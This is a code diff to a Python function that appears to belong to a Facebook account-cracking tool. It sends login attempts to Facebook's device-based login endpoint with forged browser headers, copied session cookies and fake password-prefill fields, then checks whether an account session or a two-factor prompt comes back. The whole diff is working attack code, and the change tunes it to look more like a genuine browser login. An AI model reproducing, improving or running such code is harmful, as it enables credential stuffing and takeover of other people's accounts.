@@ -1242,29 +1242,45 @@ def mbasic(uid,pwx,tl):
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '1',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
+            'lgnrnd': '062836_tCT-',
+            'lgnjs': '1738679317',
             'email': uid,
-            'cred_type': '100',
-            'login_source': 'device_based_login_add_account',
-            'savepass': '',
-            'next': '',
-            'persistent': '',
+            'prefill_contact_point': '',
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'password',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'true',
+            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^%^2Fv^%^2FAPAfAPBFAF',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnnZ_6.AWVwCdTX2OQ',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnoiQU.AWWjGHseJGk',
             'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
             'ps_l': '1',
             'ps_n': '1',
-            'wd': '1440x402',}
+            'wd': '1440x402',
+            'sfau': 'AYgqw9njHTfnCld4t4JwvHqAJNNQghZ0AhdS8ASheFx3MEgKhVMyty66RwngdlausDS6KGj-GzrXOw4gEfWDewY_yxRDrtLm9Psyggte2mE9XVUuvA0esSVTB-zWE8eviFIcgg12tq8BQgu_mbqGlyd-kBn6CAWWgelfexlaDDx6kYYNexQdD2-36eP5SryCOuImAXnoo01MBbIB11CWKcA_CReHDu06TDbDyVkxT4-PT3oeqhLNW6lZ1Qo0A3Aib1k',
+            'sfiu': 'AYiVHJsrzVg0ousQhP4dUV0hH0fi6Mi5y0zdQDjAiOoqRoLrtv9bJW2y9HoahmMz1n6S_sj7AqfAzvAIjLONKkQ_V4uZ6ZH9vUjsIxsYenTwbtvETe2097cTRCbews0qlQI3YBlB-EcQ5-kSM73ianNYB1dacEnOQdIH5oU0o1tystYG2sT3XJyp_2C4NE7kUA6YBnEjpANzR5OWDkExHA9cJwUjcMnctbRyq5QQJ2hzYjpqsMcsKCqup0GZvYppgYA',
+            'locale': 'hi_IN',}
             headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Referer': 'https://www.facebook.com/',
+            'Referer': 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.facebook.com',
+            'Origin': 'https://hi-in.facebook.com',
             'DNT': '1',
-            'Alt-Used': 'www.facebook.com',
+            'Alt-Used': 'hi-in.facebook.com',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
@@ -1275,7 +1291,7 @@ def mbasic(uid,pwx,tl):
             'Pragma': 'no-cache',
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/'
+            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
